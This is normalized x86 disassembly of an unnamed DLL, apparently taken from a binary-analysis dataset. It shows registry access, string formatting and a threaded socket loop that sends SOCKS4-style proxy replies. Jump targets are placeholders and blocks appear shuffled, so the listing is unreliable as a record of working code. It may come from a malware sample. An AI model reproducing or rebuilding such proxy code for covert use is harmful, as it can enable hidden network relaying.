call [ wcslen@IAT ]
mov ecx 0x104
sub ecx eax
push ecx
lea eax [ ebp - 0x3cc ]
push r--data
push eax
call [ wcsncat@IAT ]
add esp 0x10
push ebx
lea eax [ ebp - 0x14fc ]
push eax
push ebx
push 0x20019
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3cc ]
push eax
push esi
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
add esi 0x104
dec [ ebp - 0x14f8 ]
jne r-xdata
mov edi [ wcslen@IAT ]
lea eax [ ebp - 0x7cc ]
push eax
mov [ esi + 0x100 ] 0x1
call edi
pop ecx
test eax eax
push esi
lea eax [ ebp - 0x7cc ]
je r-xdata
lea ecx [ ebp - 0x1500 ]
push ecx
push eax
lea eax [ ebp - 0x14f4 ]
push eax
push ebx
push edi
push [ ebp - 0x14fc ]
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call edi
pop ecx
cmp eax 0x80
jae r-xdata
push 0x100
lea eax [ ebp - 0x1c4 ]
push ebx
push eax
mov [ ebp - 0x45 ] bl
call [ memset@IAT ]
add esp 0xc
push 0x7f
lea eax [ ebp - 0x1c4 ]
push eax
push 0xffffffff
lea eax [ esi + 0x10c ]
push eax
push ebx
push 0x1
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0xc4 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x1c4 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push r--data
push r--data
push [ ebp - 0x1508 ]
call sub_10008cb9
mov esi [ esi ]
add esp 0x1c
cmp esi ebx
jne r-xdata
push r--data
push r--data
jmp r-xdata
lea eax [ ebp - 0x1504 ]
push eax
push ebx
lea eax [ ebp - 0x150c ]
push eax
push ebx
push r--data
push [ ebp - 0x14fc ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + 0x80 ]
push eax
call sub_10007497
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x7cc ]
push eax
push r--data
push r--data
push [ ebp - 0x1508 ]
call sub_10008cb9
mov ecx [ ebp - 0x4 ]
add esp 0x10
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push r--data
push 0x200
push r--data
push eax
call edi
pop ecx
mov ecx 0x200
sub ecx eax
push ecx
lea eax [ ebp - 0x7cc ]
push eax
call edi
pop ecx
lea eax [ ebp + eax * 2 - 0x7cc ]
jmp r-xdata
push [ ebp - 0x1504 ]
call [ free@IAT ]
pop ecx
push [ ebp - 0x1504 ]
push r--data
push r--data
push [ ebp - 0x1508 ]
call sub_10008cb9
add esp 0x10
mov eax [ ebp - 0x14f4 ]
mov eax [ eax ]
lea eax [ ebp - 0xc4 ]
push eax
call edi
test eax eax
mov eax [ ebp - 0x14f4 ]
pop ecx
je r-xdata
mov eax [ esi + 0x190 ]
xor ecx ecx
mov [ ebp - 0x44 ] bl
mov [ ebp - 0x14f4 ] ecx
cmp eax ebx
jbe r-xdata
mov ecx [ ebp - 0x14f4 ]
push eax
call edi
pop ecx
lea eax [ ebp + eax - 0x44 ]
push eax
call [ sprintf@IAT ]
mov eax [ esi + 0x190 ]
add esp 0xc
inc [ ebp - 0x14f4 ]
cmp [ ebp - 0x14f4 ] eax
jb r-xdata
push [ ebp - 0x14fc ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x150c ] 0x1
jne r-xdata
push eax
call ebx
add esp 0x10
add eax 0x4
push eax
push r--data
add eax 0x4
push eax
push r--data
jmp r-xdata
push [ ebp - 0x1504 ]
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x14f8 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0xc4 ]
push eax
call edi
pop ecx
mov ecx 0x80
sub ecx eax
push ecx
lea eax [ ebp - 0xc4 ]
push eax
call edi
pop ecx
lea eax [ ebp + eax - 0xc4 ]
push eax
call [ _snprintf@IAT ]
add esp 0x10
lea ecx [ ebp - 0x1504 ]
push ecx
push eax
lea eax [ ebp - 0x150c ]
push eax
push ebx
push r--data
push [ ebp - 0x14fc ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x14f8 ]
call [ free@IAT ]
pop ecx
push [ ebp - 0x14f8 ]
push r--data
push r--data
push [ ebp - 0x1508 ]
call sub_10008cb9
add esp 0x10
sub_10008cb9
push 0x18
push r--data
call sub_10014fe0
push 0x40
pop esi
push 0x80
mov ebx [ malloc@IAT ]
call ebx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10015025
retn
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x10 ]
lea eax [ esi - 0x1 ]
push eax
push edi
call [ _vsnwprintf@IAT ]
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
xor eax eax
mov [ edi + esi * 2 - 0x2 ] ax
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov esi [ ebp + 0x8 ]
add esi 0x30
mov [ ebp - 0x24 ] esi
xor cl cl
mov eax [ esi + 0x20 ]
cmp eax ebx
je r-xdata
add esi 0x40
mov [ ebp - 0x28 ] esi
push edi
call [ free@IAT ]
lea eax [ esi + esi ]
push eax
call ebx
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test cl cl
je r-xdata
mov ecx [ esi + 0x1c ]
mov ebx [ ecx + eax * 4 - 0x4 ]
dec eax
mov [ esi + 0x20 ] eax
call sub_1000a151
mov cl 0x1
mov edi eax
jmp r-xdata
push edi
mov ebx [ wcslen@IAT ]
call ebx
pop ecx
lea eax [ eax + eax + 0x8e ]
mov esi 0x10c
cmp eax esi
jae r-xdata
push [ ebp + 0xc ]
lea eax [ ebx + 0x8 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
call ebx
pop ecx
lea eax [ eax + eax + 0x8e ]
mov eax esi
jmp r-xdata
push ebx
call sub_1000315c
push edi
call [ wcslen@IAT ]
pop ecx
add eax [ ebx + 0x88 ]
lea eax [ eax + eax + 0x8e ]
mov esi 0x10c
cmp eax esi
jae r-xdata
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
test edi edi
je r-xdata
push [ ebp - 0x1c ]
call ebx
lea eax [ eax + eax + 0x8e ]
cmp eax esi
pop ecx
jb r-xdata
push eax
call sub_10007c8b
mov edi eax
test edi edi
mov [ ebp - 0x20 ] edi
pop ecx
je r-xdata
push edi
call [ wcslen@IAT ]
pop ecx
add eax [ ebx + 0x88 ]
lea eax [ eax + eax + 0x8e ]
mov eax esi
jmp r-xdata
push edi
mov esi [ ebp - 0x24 ]
call sub_1000315c
jmp r-xdata
mov [ edi ] esi
push [ ebp + 0xc ]
lea eax [ edi + 0x8 ]
mov [ edi + 0x4 ] 0x3
push eax
mov esi [ wcscpy@IAT ]
call esi
push [ ebp - 0x1c ]
call ebx
mov [ edi + 0x88 ] eax
push [ ebp - 0x1c ]
lea eax [ edi + 0x8c ]
push eax
call esi
add esp 0x14
push [ ebp - 0x1c ]
call ebx
pop ecx
lea esi [ eax + eax + 0x8e ]
push ebx
call [ free@IAT ]
pop ecx
jmp r-xdata
push [ ebp - 0x1c ]
call [ wcslen@IAT ]
pop ecx
add eax [ ebx + 0x88 ]
lea eax [ eax + eax + 0x8e ]
cmp eax esi
jb r-xdata
push eax
call sub_10007c8b
pop ecx
mov edi eax
mov [ ebp - 0x20 ] edi
test edi edi
je r-xdata
mov [ edi ] esi
mov [ edi + 0x4 ] 0x3
push [ ebp + 0xc ]
lea eax [ edi + 0x8 ]
push eax
mov esi [ wcscpy@IAT ]
call esi
push [ ebp - 0x1c ]
call [ wcslen@IAT ]
add eax [ ebx + 0x88 ]
mov [ edi + 0x88 ] eax
lea eax [ edi + 0x8c ]
lea ecx [ ebx + 0x8c ]
push ecx
push eax
call esi
push [ ebp - 0x1c ]
lea eax [ edi + 0x8c ]
push eax
call [ wcscat@IAT ]
add esp 0x1c
push [ ebp - 0x1c ]
call [ wcslen@IAT ]
pop ecx
add eax [ ebx + 0x88 ]
lea esi [ eax + eax + 0x8e ]
sub_10008f0a
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_10008f2e
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10008f0a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_10008f87
push esi
push 0x114
mov esi ecx
call [ operator new@IAT ]
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_10008f4e
jmp r-xdata
mov ecx [ esi + 0x10c ]
mov [ eax + 0x10c ] ecx
mov ecx [ esi + 0x110 ]
mov [ eax + 0x110 ] ecx
pop esi
retn
sub_10008fbd
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x10c ]
imul eax eax 0x3e8
push edi
mov [ ebp - 0x10c ] eax
xor edx edx
lea eax [ ebp - 0x110 ]
push eax
push edx
push edx
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x104 ] ecx
push eax
inc ecx
push ecx
mov [ ebp - 0x108 ] 0x1
mov [ ebp - 0x110 ] edx
call [ select@IAT ]
mov edi eax
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax edi
xor ecx ebp
pop edi
call sub_10014571
leave
retn 0x4
sub_1000904f
push esi
mov esi eax
push edi
mov edi [ esi + 0x110 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
push 0x2
push edi
call [ shutdown@IAT ]
push edi
call [ closesocket@IAT ]
and [ esi + 0x110 ] 0x0
sub_10009077
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10008f6f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_100090aa
push 0x0
mov eax sub_100152d6
call sub_10015102
mov edi [ ebp + 0x8 ]
mov [ edi + 0x4 ] 0x6
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea esi [ edi + 0x200c ]
mov [ edi ] r--data
call sub_1000a051
lea esi [ edi + 0x2034 ]
call sub_1000a051
lea eax [ edi + 0x205c ]
push eax
call [ InitializeCriticalSection@IAT ]
lea esi [ edi + 0x2078 ]
call sub_1000a051
lea esi [ edi + 0x20a0 ]
call sub_1000a051
lea eax [ edi + 0x50cc ]
push eax
call [ InitializeCriticalSection@IAT ]
push 0x2000
mov [ ebp - 0x4 ] 0x2
lea eax [ edi + 0xc ]
push ebx
lea esi [ edi + 0x50ec ]
push eax
mov [ edi + 0x50e8 ] ebx
mov [ esi ] ebx
mov [ edi + 0x50e4 ] ebx
call [ memset@IAT ]
push 0x114
mov [ edi + 0x8 ] ebx
call [ operator new@IAT ]
add esp 0x10
cmp eax ebx
je r-xdata
xor eax eax
call sub_10008f4e
jmp r-xdata
push 0x3000
mov [ edi + 0x50c8 ] eax
lea eax [ edi + 0x20c8 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
push esi
push ebx
push edi
push sub_10009097
push ebx
push ebx
mov [ edi + 0x2074 ] ebx
call [ CreateThread@IAT ]
mov [ edi + 0x50e8 ] eax
mov eax edi
call sub_1001516b
retn 0x4
sub_10009199
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100091f9
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_100091f9
push 0x4
mov eax sub_1001529a
call sub_10015102
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x50e8 ]
xor esi esi
inc ebx
cmp eax esi
je r-xdata
mov ecx [ edi + 0x50c8 ]
cmp ecx esi
je r-xdata
push 0xffffffff
push eax
mov [ edi + 0x50e4 ] ebx
call [ WaitForSingleObject@IAT ]
push esi
push [ edi + 0x50e8 ]
call [ TerminateThread@IAT ]
push [ edi + 0x50e8 ]
call [ CloseHandle@IAT ]
mov [ edi + 0x50e8 ] esi
mov [ edi + 0x50ec ] esi
mov [ edi + 0x50e4 ] esi
mov ebx 0x400
lea esi [ edi + 0x10 ]
mov [ ebp - 0x10 ] ebx
mov eax [ ecx ]
push ebx
call [ eax ]
add esi 0x8
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
lea esi [ edi + 0x20cc ]
push eax
call [ closesocket@IAT ]
add esi 0xc
dec ebx
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ edi + 0x2034 ]
call sub_1000a107
mov esi [ free@IAT ]
jmp r-xdata
push eax
call [ closesocket@IAT ]
test al al
jne r-xdata
push [ ebp - 0x10 ]
call esi
pop ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ edi + 0x2034 ]
call sub_1000a107
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ edi + 0x200c ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x10 ]
call esi
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ edi + 0x20a0 ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x10 ]
call esi
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ edi + 0x2078 ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x10 ]
call esi
pop ecx
lea eax [ edi + 0x50cc ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ edi + 0x20a0 ]
call sub_1000a06f
lea ecx [ edi + 0x2078 ]
call sub_1000a06f
lea esi [ edi + 0x8 ]
call sub_100091b9
mov [ edi ] r--data
call sub_1001516b
retn
sub_1000936c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x50e8 ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x50c8 ]
cmp ecx ebx
je r-xdata
push 0xffffffff
push eax
mov [ esi + 0x50e4 ] 0x1
call [ WaitForSingleObject@IAT ]
push [ esi + 0x50e8 ]
call [ CloseHandle@IAT ]
mov [ esi + 0x50e8 ] ebx
mov [ esi + 0x50ec ] ebx
mov [ esi + 0x50e4 ] ebx
mov ebx 0x400
lea edi [ esi + 0x10 ]
mov [ ebp - 0x4 ] ebx
mov eax [ ecx ]
push 0x1
call [ eax ]
add edi 0x8
dec [ ebp - 0x4 ]
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ edi - 0x4 ] 0x0
je r-xdata
lea edi [ esi + 0x20cc ]
push eax
call [ closesocket@IAT ]
add edi 0xc
dec ebx
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ edi - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x2034 ]
call sub_1000a107
mov edi [ free@IAT ]
jmp r-xdata
push eax
call [ closesocket@IAT ]
test al al
jne r-xdata
push [ ebp - 0x4 ]
call edi
pop ecx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x2034 ]
call sub_1000a107
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x200c ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x4 ]
call edi
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x20a0 ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x4 ]
call edi
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x2078 ]
call sub_1000a107
test al al
jne r-xdata
push [ ebp - 0x4 ]
call edi
pop ecx
mov edi [ memset@IAT ]
and [ esi + 0x50e8 ] 0x0
xor eax eax
push 0x2000
lea ebx [ esi + 0x50ec ]
push eax
mov [ ebx ] eax
mov [ esi + 0x50e4 ] eax
lea eax [ esi + 0xc ]
push eax
call edi
and [ esi + 0x8 ] 0x0
push 0x114
call [ operator new@IAT ]
add esp 0x10
test eax eax
je r-xdata
xor eax eax
call sub_10008f4e
jmp r-xdata
push 0x3000
mov [ esi + 0x50c8 ] eax
lea eax [ esi + 0x20c8 ]
push 0x0
push eax
call edi
add esp 0xc
push ebx
xor eax eax
push eax
push esi
push sub_10009097
push eax
push eax
mov [ esi + 0x2074 ] eax
call [ CreateThread@IAT ]
pop edi
mov [ esi + 0x50e8 ] eax
pop esi
pop ebx
leave
retn
sub_1000950c
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi ecx
push edi
mov edi [ EnterCriticalSection@IAT ]
lea ebx [ esi + 0x205c ]
push ebx
call edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x2034 ]
call sub_1000a107
push ebx
test al al
je r-xdata
mov ebx [ LeaveCriticalSection@IAT ]
call ebx
lea eax [ esi + 0x50cc ]
push eax
mov [ ebp - 0x8 ] eax
call edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0x20a0 ]
call sub_1000a107
xor esi esi
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
call [ LeaveCriticalSection@IAT ]
xor eax eax
inc eax
jmp r-xdata
push [ ebp - 0x8 ]
call ebx
mov eax esi
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
inc esi
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1000959e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
cmp [ eax ] ebx
je r-xdata
push edi
push ebx
call sub_10007c8b
mov edi eax
pop ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
pop edi
push ebx
push [ ebp + 0x8 ]
push edi
call [ memcpy@IAT ]
add esp 0xc
cmp [ edi + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
lea ebx [ esi + 0x50cc ]
push ebx
call [ EnterCriticalSection@IAT ]
add esi 0x2078
lea ebx [ esi + 0x205c ]
push ebx
call [ EnterCriticalSection@IAT ]
add esi 0x200c
jmp r-xdata
push edi
call sub_1000a093
push ebx
call [ LeaveCriticalSection@IAT ]
sub_10009614
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x554
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x550 ] eax
push ebx
xor eax eax
push esi
push edi
mov edi ecx
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x40 ] r--data
mov [ esp + 0x48 ] al
mov [ esp + 0x148 ] eax
mov [ esp + 0x14c ] eax
mov [ esp + 0x150 ] eax
mov [ esp + 0x44 ] eax
cmp [ edi + 0x50e4 ] eax
jne r-xdata
lea eax [ esp + 0x40 ]
mov [ esp + 0x40 ] r--data
call sub_10009032
lea eax [ esp + 0x40 ]
call sub_1000904f
mov ecx [ esp + 0x55c ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_10014571
mov esp ebp
pop ebp
retn
lea eax [ edi + 0x205c ]
mov [ esp + 0x1c ] eax
lea eax [ edi + 0x200c ]
mov [ esp + 0x30 ] eax
lea eax [ edi + 0x50cc ]
mov [ esp + 0x18 ] eax
lea eax [ edi + 0x2078 ]
mov [ esp + 0x34 ] eax
push [ esp + 0x1c ]
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x34 ]
call sub_1000a107
push [ esp + 0x1c ]
mov bl al
call [ LeaveCriticalSection@IAT ]
test bl bl
je r-xdata
lea ebx [ edi + 0xc ]
mov [ esp + 0x10 ] 0x400
cmp [ edi + 0x2074 ] 0x0
je r-xdata
mov esi [ esp + 0x24 ]
mov eax [ esi + 0x4 ]
xor ebx ebx
sub eax ebx
je r-xdata
add ebx 0x8
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push 0x0
lea esi [ esp + 0x44 ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x150 ] eax
call sub_10008fbd
test eax eax
je r-xdata
push [ esp + 0x18 ]
and [ esp + 0x14 ] 0x0
mov esi 0x400
call [ EnterCriticalSection@IAT ]
lea eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x38 ]
call sub_1000a107
push [ esp + 0x18 ]
mov bl al
call [ LeaveCriticalSection@IAT ]
test bl bl
je r-xdata
mov ebx [ edi + 0x50c8 ]
call sub_1000a331
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ edi + 0x8 ] ebx
je r-xdata
dec eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
push 0x0
push 0x400
lea eax [ esp + 0x160 ]
push eax
push [ esp + 0x20 ]
call [ recv@IAT ]
mov [ esp + 0x14 ] eax
test eax eax
jg r-xdata
push 0x5
call [ Sleep@IAT ]
cmp [ edi + 0x50e4 ] 0x0
je r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ ebx + 0x4 ]
xor edx edx
sub eax edx
je r-xdata
lea ebx [ edi + 0x20c8 ]
mov [ esp + 0x10 ] 0x400
xor esi esi
lea eax [ edi + 0x20c8 ]
push esi
call [ free@IAT ]
pop ecx
push 0x1c
pop edi
push edi
call sub_10007c8b
mov ebx eax
mov [ ebx ] edi
mov eax [ esi + 0x4 ]
mov [ ebx + 0x4 ] eax
add esi 0xc
lea edi [ ebx + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ esp + 0x28 ]
pop ecx
push [ edi + 0x14 ]
lea eax [ esp + 0x44 ]
push [ edi + 0x10 ]
push eax
call sub_1000a494
mov esi [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
test eax eax
jle r-xdata
cmp [ edi + 0x8 ] ebx
je r-xdata
dec eax
je r-xdata
add eax 0x14
cmp eax 0x1c
jae r-xdata
call [ GetLastError@IAT ]
push 0x1c
mov [ esp + 0x18 ] eax
call sub_10007c8b
mov esi eax
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x2
mov eax [ ebx ]
pop ecx
push [ esp + 0x1c ]
mov [ esi + 0xc ] eax
mov eax [ esp + 0x18 ]
mov [ esi + 0x10 ] eax
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x2034 ]
call sub_1000a093
push [ esp + 0x1c ]
call [ LeaveCriticalSection@IAT ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x2074 ] edx
je r-xdata
dec eax
je r-xdata
add ebx 0xc
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov ebx esi
imul ebx ebx 0xc
call [ GetTickCount@IAT ]
mov [ ebx + edi + 0x20c8 ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + edi + 0x20cc ] eax
lea eax [ esi + 0x2bc ]
imul eax eax 0xc
and [ eax + edi ] 0x0
inc esi
add eax 0xc
cmp esi 0x400
jb r-xdata
mov [ ebx + 0x18 ] 0x274d
xor eax eax
mov [ ebx + 0x18 ] eax
mov edx [ edi + 0xc ]
lea ecx [ esi + 0xc ]
mov edx [ esi + 0xc ]
xor ecx ecx
lea eax [ edi + 0xc ]
mov edx [ esi + 0xc ]
xor eax eax
lea ecx [ edi + 0xc ]
dec eax
je r-xdata
push eax
call sub_10007c8b
mov esi eax
mov eax [ esp + 0x18 ]
add eax 0x14
pop ecx
cmp eax 0x1c
jae r-xdata
push 0x1c
pop eax
and [ ebx ] 0x0
and [ ebx + 0x4 ] 0x0
jmp r-xdata
push eax
call [ closesocket@IAT ]
mov ecx [ ebx + 0xc ]
xor esi esi
lea eax [ edi + 0x20c8 ]
cmp [ edi + 0x2074 ] edx
je r-xdata
dec eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
xor esi esi
lea ecx [ esp + 0x38 ]
push ecx
push esi
push esi
lea ecx [ esp + 0x164 ]
mov [ esp + 0x168 ] eax
push ecx
inc eax
push eax
mov [ esp + 0x16c ] 0x1
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] esi
call [ select@IAT ]
cmp eax esi
jle r-xdata
mov eax [ edi + 0x50c8 ]
and [ eax + 0x10c ] 0x0
push [ esp + 0x10 ]
call [ closesocket@IAT ]
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
and [ esi + eax * 8 + 0xc ] 0x0
lea eax [ esi + eax * 8 + 0x10 ]
mov ecx [ eax ]
mov [ esp + 0x10 ] eax
test ecx ecx
je r-xdata
inc eax
add ecx 0x8
cmp eax 0x400
jb r-xdata
mov ecx [ edi + ecx * 8 + 0x10 ]
cmp ecx ebx
je r-xdata
inc ecx
add eax 0x8
cmp ecx 0x400
jb r-xdata
and [ edi + eax * 8 + 0xc ] ebx
lea ebx [ edi + eax * 8 + 0x10 ]
mov eax [ ebx ]
test eax eax
je r-xdata
inc eax
add ecx 0x8
cmp eax 0x400
jb r-xdata
mov [ edi + 0x8 ] 0x1
jmp r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x14 ]
add eax 0x14
push 0x1c
pop eax
jmp r-xdata
mov [ esp + 0x28 ] dl
movzx eax [ ebx + 0x14 ]
push eax
call [ htons@IAT ]
mov [ esp + 0x2a ] ax
mov eax [ ebx + 0x10 ]
mov [ esp + 0x2c ] eax
cmp [ ebx + 0x18 ] 0x0
push 0x0
setne al
add al 0x5a
mov [ esp + 0x2d ] al
mov eax esi
imul eax eax 0xc
push 0x8
lea ecx [ esp + 0x30 ]
add eax edi
push ecx
push [ eax + 0x20cc ]
mov [ esp + 0x20 ] eax
call [ send@IAT ]
cmp eax 0x8
jne r-xdata
inc esi
add eax 0xc
cmp esi 0x400
jb r-xdata
mov ecx [ ebx + 0xc ]
mov [ esp + 0x14 ] edx
lea eax [ edi + 0x20c8 ]
mov ebx [ ebx + 0xc ]
xor eax eax
lea ecx [ edi + 0x20c8 ]
dec eax
je r-xdata
jge r-xdata
push esi
push 0x200
lea eax [ esp + 0x160 ]
push eax
push [ ebx + 0x4 ]
call [ recv@IAT ]
mov [ esp + 0x14 ] eax
cmp eax esi
jle r-xdata
cmp esi 0x400
jb r-xdata
and [ eax ] 0x0
push ecx
call [ closesocket@IAT ]
mov eax [ esp + 0x10 ]
cmp [ ecx ] edx
je r-xdata
jmp r-xdata
push [ esi + 0x10 ]
lea eax [ esi + 0x14 ]
push eax
lea edi [ esp + 0x48 ]
mov [ esp + 0x154 ] ecx
call sub_1000a5f9
test eax eax
jns r-xdata
cmp [ eax ] edx
je r-xdata
jmp r-xdata
and [ ebx ] 0x0
jmp r-xdata
push eax
call [ closesocket@IAT ]
cmp [ ecx ] edx
je r-xdata
jmp r-xdata
and [ edi + 0x8 ] ebx
lea ebx [ edi + 0x10 ]
mov [ esp + 0x10 ] 0x400
mov [ esi ] eax
mov [ esi + 0x4 ] 0x1
mov eax [ ebx ]
mov [ esi + 0xc ] eax
mov eax [ esp + 0x14 ]
push eax
mov [ esi + 0x10 ] eax
lea eax [ esp + 0x15c ]
push eax
lea eax [ esi + 0x14 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
push [ esp + 0x1c ]
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x2034 ]
call sub_1000a093
push [ esp + 0x1c ]
call [ LeaveCriticalSection@IAT ]
push 0x1c
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
add esi 0x2bc
imul esi esi 0xc
mov [ esi + edi ] 0x1
jmp r-xdata
cmp [ eax ] ecx
je r-xdata
jmp r-xdata
mov eax [ esp + 0x14 ]
imul eax eax 0xc
add eax edi
mov [ esp + 0x10 ] eax
mov eax [ eax + 0x20cc ]
test eax eax
je r-xdata
inc [ esp + 0x14 ]
add eax 0xc
cmp [ esp + 0x14 ] esi
jb r-xdata
imul eax eax 0xc
lea ebx [ eax + edi ]
mov eax [ ebx + 0x20cc ]
cmp eax edx
je r-xdata
inc eax
add ecx 0xc
cmp eax esi
jb r-xdata
mov eax [ ebx + 0xc ]
mov esi [ edi + 0x50c8 ]
and [ esp + 0x10 ] edx
call sub_1000a2dc
test eax eax
jle r-xdata
dec eax
jne r-xdata
cmp [ ebx + 0x8 ] esi
jle r-xdata
push 0x1c
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp [ ebx + 0x8 ] esi
jne r-xdata
mov ecx [ edi + 0xc ]
mov [ esi + eax * 8 + 0xc ] ecx
mov ecx [ esp + 0x14 ]
mov [ esi + eax * 8 + 0x10 ] ecx
jmp r-xdata
inc eax
add ecx 0x8
cmp eax 0x400
jb r-xdata
xor eax eax
lea ecx [ esi + 0xc ]
mov edi [ esp + 0x20 ]
push 0x1c
pop edi
push edi
